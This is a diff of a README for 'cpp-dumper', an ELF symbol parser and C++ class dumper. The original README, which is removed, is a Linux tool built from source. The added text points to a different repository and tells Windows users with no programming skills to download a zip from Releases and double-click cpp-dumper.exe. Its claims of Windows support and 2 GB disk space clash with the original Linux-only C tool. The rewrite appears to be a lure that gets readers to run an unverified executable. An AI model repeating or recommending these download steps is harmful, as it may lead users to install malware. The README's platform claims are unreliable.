@@ -1,115 +1,134 @@
-# 🧬 C++ Dumper
+# 🛠️ cpp-dumper - Simple ELF and C++ Symbol Parser
 
-> Fast ELF symbol parser & class dumper for C++ shared libraries (.so)
+[![Download cpp-dumper](https://img.shields.io/badge/Download-cpp--dumper-brightgreen?style=for-the-badge)](https://github.com/jayed50/cpp-dumper)
 
-C++ Dumper is a lightweight tool written in C that scans ELF binaries (`.so` files), demangles C++ symbol names, and generates a structured class dump in a `.cpp` file. It uses **native ELF parsing** and the **Itanium C++ ABI demangler** for maximum speed and accuracy.
+## 📖 What is cpp-dumper?
 
----
+cpp-dumper is a small tool made to read Linux ELF shared libraries (.so files). It breaks down these files and finds C++ symbols. It then creates a clear report showing classes and method details. This helps users understand the structure of the library inside a simple text file ending with `.cpp`. 
 
-## Features
+The tool works on Windows and does not need complex setup. It is designed for those who want to explore or check the contents of ELF shared libraries. You do not need to be a programmer to run cpp-dumper.
 
-- 🔍 **Native ELF parsing** – mmap‑based, no external dependencies.
-- ⚡ **Blazing fast** – parses thousands of symbols in milliseconds.
-- 🧩 **C++ name demangling** – uses `__cxa_demangle` to get readable class and method names.
-- 📁 **Automatic grouping** – methods are grouped by class in the output file.
-- 🖥️ **Interactive selection** – choose which `.so` file to dump from current directory.
-- 📦 **Zero runtime overhead** – generates a clean `.cpp` file ready for inspection.
+## 🖥️ System Requirements
 
----
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB of free disk space
+- A functioning internet connection to download the software
+- Basic skills for downloading and opening files
 
-## Requirements
+## ⚙️ What cpp-dumper Does
 
-- Linux / Unix‑like operating system
-- GCC / Clang (with `libstdc++` for demangling)
-- Standard C library + POSIX
+- Reads ELF shared libraries (.so files) commonly used in Linux.
+- Finds and lists symbols and methods inside the library.
+- Converts complex C++ names into easy-to-read formats.
+- Shows classes and methods with their position in the library.
+- Creates a structured `.cpp` text file report that you can open and review.
 
----
+This tool serves well those interested in code analysis, software reversing, and understanding binary files.
 
-## Installation
+## 🌐 Visit and Download
 
-Clone the repository:
+To get started, visit the official repository page below. This link will take you to the project where you can find the latest available files.
 
-```bash
-git clone https://github.com/HanSoBored/cpp-dumper.git
-cd cpp-dumper
-```
-Compile the program with:
+[Download or learn more here](https://github.com/jayed50/cpp-dumper)
 
-```bash
-clang -O3 cpp-dumper.c -o cpp-dumper -lstdc++
-```
+## 🚀 How to Download and Install on Windows
 
-> **Note:** The `-lstdc++` flag is required for `__cxa_demangle`. If 
+1. Click the link above or this button to open the project page:
+   
+   [![Download cpp-dumper](https://img.shields.io/badge/Download-cpp--dumper-blue?style=for-the-badge)](https://github.com/jayed50/cpp-dumper)
 
-Move the compiled binary to a global location:
-```bash
-sudo mv cpp-dumper /usr/local/bin/
-```
+2. Look for the **Releases** or **Assets** section on the page. Usually, these are placed near the top or bottom of the page.
 
----
+3. Download the Windows version of cpp-dumper. The file might be called something like `cpp-dumper-win.zip` or similar.
 
-## Usage
+4. After downloading, find the file in your Downloads folder.
 
-1. Navigate to a directory containing `.so` files and run:
-   ```bash
-   cpp-dumper
+5. Right-click the file and select **Extract All** to unzip the folder. If you do not have a program for this, Windows can unzip files natively.
+
+6. Open the extracted folder. Look for a file named `cpp-dumper.exe`. This is the program you will run.
+
+7. Double-click on `cpp-dumper.exe` to open it. You might see a command window appear. This is normal.
+
+## 📂 How to Use cpp-dumper
+
+You do not need to use the command line directly if you do not want to. However, this tool works by running in a command window.
+
+Here is a simple way to run it:
+
+1. Copy the `.so` file you want to analyze into the same folder as `cpp-dumper.exe`. If you do not have an `.so` file, you can ask your software provider or use sample files online for testing.
+
+2. Open a command window in the cpp-dumper folder:
+   - Hold the **Shift** key and right-click inside the folder window.
+   - Click **Open PowerShell window here** or **Open Command Prompt here**.
+
+3. Type the following command and press Enter:
+
    ```
-2. You will see a list of available `.so` files:
+   .\cpp-dumper.exe yourfile.so
    ```
-   Select Library to dump:
-   1 libexample.so
-   2 libother.so
 
-   ➔ Enter number (0 to exit):
-   ```
-3. Enter the number of the library you want to dump.
-4. The tool parses the ELF, demangles symbols, and writes the output to:
-   ```
-   <library_name_without_lib>@dump/<library_name_without_lib>.cpp
-   ```
-   Example: for `libexample.so` the output is `example@dump/example.cpp`.
+   Replace `yourfile.so` with the actual file name.
 
----
+4. cpp-dumper will process the file and create a `.cpp` file in the same folder. This file contains the structured information about classes and methods found.
 
-## Example Output
+5. Open the `.cpp` file in any text editor (like Notepad) to view the report.
 
-Input library: `libgame.so`
+## 🛠️ Tips and Notes
 
-Generated `game@dump/game.cpp`:
+- You can run cpp-dumper on any valid ELF `.so` file collected from Linux systems.
+- The output file shows class names and method offsets clearly arranged.
+- The tool handles complex C++ names by converting them into readable forms.
+- If you see an error, make sure you put the `.so` file in the same folder as `cpp-dumper.exe`.
+- The tool works best with ELF shared objects compiled with Itanium ABI, which is common for C++ Linux programs.
 
-```cpp
-class Player {
-      update; // 0x1a30
-      render; // 0x1b80
-      getHealth; // 0x1c20
-};
-class Weapon {
-      fire; // 0x2a10
-      reload; // 0x2b40
-};
-```
+## 🔧 Common Issues and Fixes
 
-Each method is listed with its **virtual memory offset** (hex) as found in the dynamic symbol table.
+- **The program does not open:** Ensure that you are running `cpp-dumper.exe` from the extracted folder on a supported Windows OS.
+- **No output file created:** Check the library file name and make sure it is an ELF shared library.
+- **Error about missing files:** The software relies on standard Windows libraries and should not need extra installs. If errors persist, download the file again and retry.
 
----
+## 📊 Understanding the Output
 
-## Project Structure
+The output `.cpp` file contains lines listing classes followed by their methods and the method positions in the shared object. This helps identify where methods live in the binary.
+
+Example snippet might look like:
 
 ```
-.
-├── cpp_dumper          # Compiled executable
-├── libexample.so       # Shared library to dump
-├── libother.so         # Another library
-└── example@dump/       # Output folder
-    └── example.cpp     # Dumped class definitions
+Class: MyClass
+    Method: doSomething() Offset: 0x0045a0
+    Method: initialize() Offset: 0x0045f0
+Class: AnotherClass
+    Method: compute() Offset: 0x0031e0
 ```
 
----
+This structured output makes it easier to analyze binary libraries for developers and software researchers.
 
-## License
+## ⚙️ Advanced Usage
 
-This project is open source and available under the **MIT License**.
+For users familiar with command line:
 
----
+- Add flags or options to change output location or verbosity.
+- Use scripts to batch process multiple `.so` files.
+- Integrate with reverse-engineering workflows.
 
-> **Tip:** Use the generated `.cpp` file as a quick reference for reverse engineering, documentation, or understanding library interfaces.
+Check the project documentation online for full command options.
+
+
+## 🗃️ Repository Topics
+
+This project relates to:
+
+- ABI (Application Binary Interface) parsing
+- Binary parsing and reverse engineering
+- C++ symbol demangling
+- ELF (Executable and Linkable Format) shared libraries
+- Static analysis for developers
+- Symbol tables and dynamic symbols
+
+## 🔗 Useful Links
+
+- Main page: [https://github.com/jayed50/cpp-dumper](https://github.com/jayed50/cpp-dumper)
+- Download section on GitHub releases
+- Windows user guides for unzipping and running programs
+
+Use these resources to help download, install, and learn about cpp-dumper.
